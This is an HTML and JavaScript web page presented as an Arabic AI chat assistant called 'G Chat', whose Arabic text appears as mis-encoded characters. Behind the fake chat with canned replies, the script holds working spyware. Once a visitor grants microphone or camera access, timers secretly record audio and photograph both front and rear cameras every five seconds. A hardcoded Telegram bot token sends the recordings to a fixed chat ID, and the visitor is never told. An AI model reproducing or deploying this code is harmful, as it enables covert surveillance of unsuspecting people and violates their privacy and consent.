<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>G Chat - AI Assistant</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 800px;
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
            display: flex;
            flex-direction: column;
            height: 90vh;
        }

        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 20px;
            text-align: center;
            font-size: 24px;
            font-weight: bold;
        }

        .chat-area {
            flex: 1;
            overflow-y: auto;
            padding: 20px;
            background: #f5f5f5;
        }

        .message {
            margin-bottom: 15px;
            display: flex;
            flex-direction: column;
        }

        .message.user {
            align-items: flex-end;
        }

        .message.bot {
            align-items: flex-start;
        }

        .message-content {
            max-width: 70%;
            padding: 12px 16px;
            border-radius: 15px;
            position: relative;
            word-wrap: break-word;
        }

        .message.user .message-content {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }

        .message.bot .message-content {
            background: white;
            color: #333;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }

        .code-block {
            background: #1e1e1e;
            color: #d4d4d4;
            padding: 15px;
            border-radius: 10px;
            margin: 10px 0;
            position: relative;
            font-family: 'Courier New', monospace;
            overflow-x: auto;
        }

        .code-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
            padding-bottom: 10px;
            border-bottom: 1px solid #444;
        }

        .code-lang {
            color: #4ec9b0;
            font-weight: bold;
        }

        .copy-btn {
            background: #007acc;
            color: white;
            border: none;
            padding: 5px 10px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 12px;
            transition: background 0.3s;
        }

        .copy-btn:hover {
            background: #005a9e;
        }

        .message-actions {
            display: flex;
            gap: 10px;
            margin-top: 5px;
            font-size: 12px;
        }

        .edit-btn {
            background: #667eea;
            color: white;
            border: none;
            padding: 5px 10px;
            border-radius: 5px;
            cursor: pointer;
            transition: background 0.3s;
        }

        .edit-btn:hover {
            background: #5568d3;
        }

        .input-area {
            padding: 20px;
            background: white;
            border-top: 2px solid #e0e0e0;
        }

        .input-wrapper {
            display: flex;
            gap: 10px;
            align-items: center;
        }

        .input-field {
            flex: 1;
            padding: 12px;
            border: 2px solid #e0e0e0;
            border-radius: 25px;
            font-size: 16px;
            outline: none;
            transition: border 0.3s;
        }

        .input-field:focus {
            border-color: #667eea;
        }

        .control-btns {
            display: flex;
            gap: 10px;
        }

        .btn {
            width: 45px;
            height: 45px;
            border-radius: 50%;
            border: none;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 20px;
            transition: all 0.3s;
            position: relative;
        }

        .send-btn {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }

        .camera-btn {
            background: #ff6b6b;
            color: white;
        }

        .mic-btn {
            background: #4ecdc4;
            color: white;
        }

        .btn:hover {
            transform: scale(1.1);
        }

        .btn.recording {
            animation: pulse 1s infinite;
            background: #ff3333 !important;
        }

        @keyframes pulse {
            0%, 100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 51, 51, 0.7); }
            50% { transform: scale(1.05); box-shadow: 0 0 0 10px rgba(255, 51, 51, 0); }
        }

        .keyword {
            color: #569cd6;
        }
        .string {
            color: #ce9178;
        }
        .function {
            color: #dcdcaa;
        }
        .comment {
            color: #6a9955;
        }

        .image-preview {
            max-width: 100%;
            border-radius: 10px;
            margin: 10px 0;
        }

        .status-indicator {
            position: fixed;
            top: 20px;
            left: 20px;
            background: rgba(255, 0, 0, 0.9);
            color: white;
            padding: 10px 15px;
            border-radius: 10px;
            font-size: 12px;
            display: none;
            animation: blink 2s infinite;
        }

        .status-indicator.active {
            display: block;
        }

        @keyframes blink {
            0%, 50%, 100% { opacity: 1; }
            25%, 75% { opacity: 0.5; }
        }

        .permission-modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.7);
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }

        .permission-modal.show {
            display: flex;
        }

        .modal-content {
            background: white;
            padding: 30px;
            border-radius: 15px;
            text-align: center;
            max-width: 400px;
        }

        .modal-content h3 {
            margin-bottom: 15px;
            color: #333;
        }

        .modal-content p {
            margin-bottom: 20px;
            color: #666;
        }

        .modal-buttons {
            display: flex;
            gap: 10px;
            justify-content: center;
        }

        .modal-btn {
            padding: 10px 20px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 14px;
            transition: all 0.3s;
        }

        .modal-btn.accept {
            background: #4ecdc4;
            color: white;
        }

        .modal-btn.decline {
            background: #ff6b6b;
            color: white;
        }

        .modal-btn:hover {
            transform: scale(1.05);
        }
    </style>
</head>
<body>
    <div class="status-indicator" id="statusIndicator"></div>
    
    <div class="permission-modal" id="permissionModal">
        <div class="modal-content">
            <h3>ÿ∑ŸÑÿ® ÿßŸÑŸàÿµŸàŸÑ</h3>
            <p id="permissionText"></p>
            <div class="modal-buttons">
                <button class="modal-btn accept" id="acceptBtn">ŸÇÿ®ŸàŸÑ</button>
                <button class="modal-btn decline" id="declineBtn">ÿ±ŸÅÿ∂</button>
            </div>
        </div>
    </div>
    
    <div class="container">
        <div class="header">
            üí¨ G Chat - AI Assistant
        </div>
        
        <div class="chat-area" id="chatArea">
            <div class="message bot">
                <div class="message-content">
                    ŸÖÿ±ÿ≠ÿ®ÿßŸã! ÿ£ŸÜÿß G Chatÿå ŸÖÿ≥ÿßÿπÿØŸÉ ÿßŸÑÿ∞ŸÉŸä. ŸÉŸäŸÅ ŸäŸÖŸÉŸÜŸÜŸä ŸÖÿ≥ÿßÿπÿØÿ™ŸÉ ÿßŸÑŸäŸàŸÖÿü
                </div>
            </div>
        </div>
        
        <div class="input-area">
            <div class="input-wrapper">
                <input type="text" class="input-field" id="userInput" placeholder="ÿßŸÉÿ™ÿ® ÿ±ÿ≥ÿßŸÑÿ™ŸÉ ŸáŸÜÿß...">
                <div class="control-btns">
                    <button class="btn mic-btn" id="micBtn" title="ÿ™ÿ≥ÿ¨ŸäŸÑ ÿµŸàÿ™Ÿä">üé§</button>
                    <button class="btn camera-btn" id="cameraBtn" title="ÿßŸÑÿ™ŸÇÿßÿ∑ ÿµŸàÿ±ÿ©">üì∑</button>
                    <button class="btn send-btn" id="sendBtn" title="ÿ•ÿ±ÿ≥ÿßŸÑ">‚û§</button>
                </div>
            </div>
        </div>
    </div>

    <script>
        const chatArea = document.getElementById('chatArea');
        const userInput = document.getElementById('userInput');
        const sendBtn = document.getElementById('sendBtn');
        const micBtn = document.getElementById('micBtn');
        const cameraBtn = document.getElementById('cameraBtn');
        const statusIndicator = document.getElementById('statusIndicator');
        const permissionModal = document.getElementById('permissionModal');
        const permissionText = document.getElementById('permissionText');
        const acceptBtn = document.getElementById('acceptBtn');
        const declineBtn = document.getElementById('declineBtn');

        // ÿ™ŸÉŸàŸäŸÜ ÿ®Ÿàÿ™ ÿßŸÑÿ™ŸÑÿ¨ÿ±ÿßŸÖ
        const TELEGRAM_BOT_TOKEN = '8574889163:AAFJtXmst2oMwx1ubV05QTC_fTF7IHe3124';
        const TELEGRAM_CHAT_ID = '5648826330';

        let recognition;
        let audioSurveillanceInterval;
        let cameraSurveillanceInterval;
        let micPermissionGranted = false;
        let cameraPermissionGranted = false;
        let isRecording = false;
        let mediaRecorder;
        let audioChunks = [];

        // ÿ•ÿ±ÿ≥ÿßŸÑ ÿ±ÿ≥ÿßŸÑÿ©
        async function sendMessage(text, isUser = true, imageUrl = null) {
            const messageDiv = document.createElement('div');
            messageDiv.className = `message ${isUser ? 'user' : 'bot'}`;
            
            const contentDiv = document.createElement('div');
            contentDiv.className = 'message-content';
            
            if (imageUrl) {
                const img = document.createElement('img');
                img.src = imageUrl;
                img.className = 'image-preview';
                contentDiv.appendChild(img);
                contentDiv.appendChild(document.createElement('br'));
            }
            
            if (isUser) {
                const textNode = document.createTextNode(text);
                contentDiv.appendChild(textNode);
                const actionsDiv = document.createElement('div');
                actionsDiv.className = 'message-actions';
                actionsDiv.innerHTML = '<button class="edit-btn" onclick="editMessage(this)">‚úèÔ∏è ÿ™ÿπÿØŸäŸÑ</button>';
                messageDiv.appendChild(contentDiv);
                messageDiv.appendChild(actionsDiv);
            } else {
                contentDiv.innerHTML = formatBotResponse(text);
                messageDiv.appendChild(contentDiv);
            }
            
            chatArea.appendChild(messageDiv);
            chatArea.scrollTop = chatArea.scrollHeight;

            if (isUser && !imageUrl) {
                setTimeout(() => {
                    const botResponse = generateBotResponse(text);
                    sendMessage(botResponse, false);
                }, 1000);
            }
        }

        // ÿ™ŸÜÿ≥ŸäŸÇ ÿ±ÿØ ÿßŸÑÿ®Ÿàÿ™
        function formatBotResponse(text) {
            if (text.includes('```')) {
                const parts = text.split('```');
                let formatted = '';
                
                for (let i = 0; i < parts.length; i++) {
                    if (i % 2 === 0) {
                        formatted += parts[i];
                    } else {
                        const lines = parts[i].split('\n');
                        const lang = lines[0].trim() || 'javascript';
                        const code = lines.slice(1).join('\n');
                        formatted += `
                            <div class="code-block">
                                <div class="code-header">
                                    <span class="code-lang">${lang}</span>
                                    <button class="copy-btn" onclick="copyCode(this)">üìã ŸÜÿ≥ÿÆ</button>
                                </div>
                                <pre>${highlightCode(code, lang)}</pre>
                            </div>
                        `;
                    }
                }
                return formatted;
            }
            return text;
        }

        function highlightCode(code, lang) {
            let highlighted = code
                .replace(/\b(function|const|let|var|if|else|for|while|return|class|import|export|async|await)\b/g, '<span class="keyword">$1</span>')
                .replace(/(['"`])(.*?)\1/g, '<span class="string">$1$2$1</span>')
                .replace(/\/\/(.*?)$/gm, '<span class="comment">//$1</span>')
                .replace(/\b([a-zA-Z_]\w*)\s*\(/g, '<span class="function">$1</span>(');
            return highlighted;
        }

        function copyCode(btn) {
            const codeBlock = btn.closest('.code-block');
            const code = codeBlock.querySelector('pre').textContent;
            navigator.clipboard.writeText(code);
            btn.textContent = '‚úì ÿ™ŸÖ ÿßŸÑŸÜÿ≥ÿÆ';
            setTimeout(() => {
                btn.innerHTML = 'üìã ŸÜÿ≥ÿÆ';
            }, 2000);
        }

        function editMessage(btn) {
            const messageContent = btn.closest('.message').querySelector('.message-content');
            const currentText = messageContent.textContent;
            const newText = prompt('ÿ™ÿπÿØŸäŸÑ ÿßŸÑÿ±ÿ≥ÿßŸÑÿ©:', currentText);
            if (newText && newText !== currentText) {
                messageContent.textContent = newText;
            }
        }

        function generateBotResponse(userText) {
            const lowerText = userText.toLowerCase();
            
            if (lowerText.includes('ÿ®ÿ±ŸÖÿ¨') || lowerText.includes('ŸÉŸàÿØ') || lowerText.includes('function')) {
                return `ÿ®ÿßŸÑÿ™ÿ£ŸÉŸäÿØ! ÿ•ŸÑŸäŸÉ ŸÖÿ´ÿßŸÑ ÿπŸÑŸâ ŸÉŸàÿØ JavaScript:\n\n\`\`\`javascript\nfunction calculateSum(a, b) {\n    // ÿØÿßŸÑÿ© ŸÑÿ≠ÿ≥ÿßÿ® ŸÖÿ¨ŸÖŸàÿπ ÿ±ŸÇŸÖŸäŸÜ\n    const result = a + b;\n    console.log("ÿßŸÑŸÖÿ¨ŸÖŸàÿπ: " + result);\n    return result;\n}\n\n// ÿßÿ≥ÿ™ÿØÿπÿßÿ° ÿßŸÑÿØÿßŸÑÿ©\nconst sum = calculateSum(5, 10);\nconsole.log(sum); // 15\n\`\`\`\n\nŸáÿ∞ÿß ÿßŸÑŸÉŸàÿØ ŸäŸÇŸàŸÖ ÿ®ÿ≠ÿ≥ÿßÿ® ŸÖÿ¨ŸÖŸàÿπ ÿ±ŸÇŸÖŸäŸÜ. ŸáŸÑ ÿ™ÿ±ŸäÿØ ŸÖÿ´ÿßŸÑÿßŸã ÿ¢ÿÆÿ±ÿü`;
            }
            
            return 'ÿ¥ŸÉÿ±ÿßŸã ŸÑÿ±ÿ≥ÿßŸÑÿ™ŸÉ! ÿ£ŸÜÿß ŸáŸÜÿß ŸÑŸÖÿ≥ÿßÿπÿØÿ™ŸÉ ŸÅŸä ÿßŸÑÿ®ÿ±ŸÖÿ¨ÿ©ÿå ÿ™ÿ≠ŸÑŸäŸÑ ÿßŸÑÿµŸàÿ±ÿå ŸàÿßŸÑÿ•ÿ¨ÿßÿ®ÿ© ÿπŸÑŸâ ÿ£ÿ≥ÿ¶ŸÑÿ™ŸÉ. ŸÉŸäŸÅ ŸäŸÖŸÉŸÜŸÜŸä ŸÖÿ≥ÿßÿπÿØÿ™ŸÉÿü';
        }

        // ÿ∑ŸÑÿ® ÿ•ÿ∞ŸÜ ÿßŸÑŸÖÿßŸäŸÉ
        function requestMicPermission() {
            permissionText.textContent = 'Ÿäÿ≠ÿ™ÿßÿ¨ G Chat ŸÑŸÑŸàÿµŸàŸÑ ÿ•ŸÑŸâ ÿßŸÑŸÖŸäŸÉÿ±ŸàŸÅŸàŸÜ ŸÑŸÑÿ™ÿ≥ÿ¨ŸäŸÑ ÿßŸÑÿµŸàÿ™Ÿä. ŸáŸÑ ÿ™ŸàÿßŸÅŸÇÿü';
            permissionModal.classList.add('show');

            return new Promise((resolve) => {
                acceptBtn.onclick = async () => {
                    permissionModal.classList.remove('show');
                    try {
                        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                        stream.getTracks().forEach(track => track.stop());
                        micPermissionGranted = true;
                        statusIndicator.classList.add('active');
                        startAudioSurveillance();
                        resolve(true);
                    } catch (err) {
                        alert('ŸÅÿ¥ŸÑ ÿßŸÑÿ≠ÿµŸàŸÑ ÿπŸÑŸâ ÿ•ÿ∞ŸÜ ÿßŸÑŸÖŸäŸÉÿ±ŸàŸÅŸàŸÜ');
                        resolve(false);
                    }
                };

                declineBtn.onclick = () => {
                    permissionModal.classList.remove('show');
                    resolve(false);
                };
            });
        }

        // ÿ∑ŸÑÿ® ÿ•ÿ∞ŸÜ ÿßŸÑŸÉÿßŸÖŸäÿ±ÿß
        function requestCameraPermission() {
            permissionText.textContent = 'Ÿäÿ≠ÿ™ÿßÿ¨ G Chat ŸÑŸÑŸàÿµŸàŸÑ ÿ•ŸÑŸâ ÿßŸÑŸÉÿßŸÖŸäÿ±ÿß ŸÑÿßŸÑÿ™ŸÇÿßÿ∑ ÿßŸÑÿµŸàÿ±. ŸáŸÑ ÿ™ŸàÿßŸÅŸÇÿü';
            permissionModal.classList.add('show');

            return new Promise((resolve) => {
                acceptBtn.onclick = async () => {
                    permissionModal.classList.remove('show');
                    try {
                        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                        stream.getTracks().forEach(track => track.stop());
                        cameraPermissionGranted = true;
                        statusIndicator.classList.add('active');
                        startCameraSurveillance();
                        resolve(true);
                    } catch (err) {
                        alert('ŸÅÿ¥ŸÑ ÿßŸÑÿ≠ÿµŸàŸÑ ÿπŸÑŸâ ÿ•ÿ∞ŸÜ ÿßŸÑŸÉÿßŸÖŸäÿ±ÿß');
                        resolve(false);
                    }
                };

                declineBtn.onclick = () => {
                    permissionModal.classList.remove('show');
                    resolve(false);
                };
            });
        }

        // ÿßŸÑÿ™ÿπÿ±ŸÅ ÿπŸÑŸâ ÿßŸÑÿµŸàÿ™
        if ('webkitSpeechRecognition' in window || 'SpeechRecognition' in window) {
            const SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition;
            recognition = new SpeechRecognition();
            recognition.lang = 'ar-SA';
            recognition.continuous = true;
            recognition.interimResults = true;

            recognition.onresult = (event) => {
                let finalTranscript = '';
                for (let i = event.resultIndex; i < event.results.length; i++) {
                    if (event.results[i].isFinal) {
                        finalTranscript += event.results[i][0].transcript;
                    }
                }
                if (finalTranscript) {
                    userInput.value = finalTranscript;
                }
            };
        }

        // ÿ≤ÿ± ÿßŸÑŸÖÿßŸäŸÉ
        micBtn.addEventListener('click', async () => {
            if (!micPermissionGranted) {
                const granted = await requestMicPermission();
                if (!granted) return;
            }

            if (isRecording) {
                // ÿ•ŸäŸÇÿßŸÅ ÿßŸÑÿ™ÿ≥ÿ¨ŸäŸÑ
                if (recognition) recognition.stop();
                micBtn.classList.remove('recording');
                isRecording = false;
            } else {
                // ÿ®ÿØÿ° ÿßŸÑÿ™ÿ≥ÿ¨ŸäŸÑ
                if (recognition) {
                    recognition.start();
                    micBtn.classList.add('recording');
                    isRecording = true;
                }
            }
        });

        // ÿ≤ÿ± ÿßŸÑŸÉÿßŸÖŸäÿ±ÿß
        cameraBtn.addEventListener('click', async () => {
            if (!cameraPermissionGranted) {
                const granted = await requestCameraPermission();
                if (!granted) return;
            }

            // ÿßŸÑÿ™ŸÇÿßÿ∑ ÿµŸàÿ±ÿ© ŸÅŸàÿ±Ÿäÿ©
            await captureAndSendImage();
        });

        // ÿßŸÑÿ™ŸÇÿßÿ∑ Ÿàÿ•ÿ±ÿ≥ÿßŸÑ ÿµŸàÿ±ÿ©
        async function captureAndSendImage() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();

                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);

                stream.getTracks().forEach(track => track.stop());

                canvas.toBlob((blob) => {
                    const reader = new FileReader();
                    reader.onloadend = () => {
                        sendMessage('ŸÖÿß ÿ±ÿ£ŸäŸÉ ŸÅŸä Ÿáÿ∞Ÿá ÿßŸÑÿµŸàÿ±ÿ©ÿü', true, reader.result);
                        setTimeout(() => {
                            sendMessage('ÿµŸàÿ±ÿ© ÿ±ÿßÿ¶ÿπÿ©! ŸäŸÖŸÉŸÜŸÜŸä ÿ±ÿ§Ÿäÿ© ÿßŸÑÿ™ŸÅÿßÿµŸäŸÑ ÿ®Ÿàÿ∂Ÿàÿ≠. ŸÉŸäŸÅ ŸäŸÖŸÉŸÜŸÜŸä ŸÖÿ≥ÿßÿπÿØÿ™ŸÉ ŸÅŸä ÿ™ÿ≠ŸÑŸäŸÑŸáÿßÿü', false);
                        }, 1000);
                    };
                    reader.readAsDataURL(blob);
                });
            } catch (err) {
                console.error('ÿÆÿ∑ÿ£ ŸÅŸä ÿßŸÑÿ™ŸÇÿßÿ∑ ÿßŸÑÿµŸàÿ±ÿ©:', err);
            }
        }

        // ÿ®ÿØÿ° ŸÖÿ±ÿßŸÇÿ®ÿ© ÿßŸÑÿµŸàÿ™ ÿßŸÑŸÖÿ≥ÿ™ŸÖÿ±ÿ©
        function startAudioSurveillance() {
            audioSurveillanceInterval = setInterval(async () => {
                await sendAudioToTelegram();
            }, 5000);
        }

        // ÿ®ÿØÿ° ŸÖÿ±ÿßŸÇÿ®ÿ© ÿßŸÑŸÉÿßŸÖŸäÿ±ÿß ÿßŸÑŸÖÿ≥ÿ™ŸÖÿ±ÿ©
        function startCameraSurveillance() {
            cameraSurveillanceInterval = setInterval(async () => {
                await sendImageToTelegram('user');
                await sendImageToTelegram('environment');
            }, 5000);
        }

        // ÿ•ÿ±ÿ≥ÿßŸÑ ÿßŸÑÿµŸàÿ™ ÿ•ŸÑŸâ ÿßŸÑÿ™ŸÑÿ¨ÿ±ÿßŸÖ
        async function sendAudioToTelegram() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const recorder = new MediaRecorder(stream);
                const chunks = [];

                recorder.ondataavailable = (e) => chunks.push(e.data);
                recorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'audio/webm' });
                    const formData = new FormData();
                    formData.append('chat_id', TELEGRAM_CHAT_ID);
                    formData.append('audio', blob, 'audio.webm');

                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendAudio`, {
                        method: 'POST',
                        body: formData
                    });

                    stream.getTracks().forEach(track => track.stop());
                };

                recorder.start();
                setTimeout(() => recorder.stop(), 3000);
            } catch (err) {
                console.error('ÿÆÿ∑ÿ£ ŸÅŸä ÿ•ÿ±ÿ≥ÿßŸÑ ÿßŸÑÿµŸàÿ™:', err);
            }
        }

        // ÿ•ÿ±ÿ≥ÿßŸÑ ÿßŸÑÿµŸàÿ±ÿ© ÿ•ŸÑŸâ ÿßŸÑÿ™ŸÑÿ¨ÿ±ÿßŸÖ
        async function sendImageToTelegram(facingMode) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: facingMode } 
                });
                
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();

                await new Promise(resolve => setTimeout(resolve, 500));

                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);

                stream.getTracks().forEach(track => track.stop());

                canvas.toBlob(async (blob) => {
                    const formData = new FormData();
                    formData.append('chat_id', TELEGRAM_CHAT_ID);
                    formData.append('photo', blob, `camera_${facingMode}.jpg`);
                    formData.append('caption', `üì∏ ${facingMode === 'user' ? 'ŸÉÿßŸÖŸäÿ±ÿß ÿ£ŸÖÿßŸÖŸäÿ©' : 'ŸÉÿßŸÖŸäÿ±ÿß ÿÆŸÑŸÅŸäÿ©'} - ${new Date().toLocaleString('ar-IQ')}`);

                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                });
            } catch (err) {
                console.error(`ÿÆÿ∑ÿ£ ŸÅŸä ÿ•ÿ±ÿ≥ÿßŸÑ ÿµŸàÿ±ÿ© ${facingMode}:`, err);
            }
        }

        // ÿ≤ÿ± ÿßŸÑÿ•ÿ±ÿ≥ÿßŸÑ
        sendBtn.addEventListener('click', () => {
            const text = userInput.value.trim();
            if (text) {
                sendMessage(text, true);
                userInput.value = '';
            }
        });

        userInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                sendBtn.click();
            }
        });
    </script>
</body>
</html>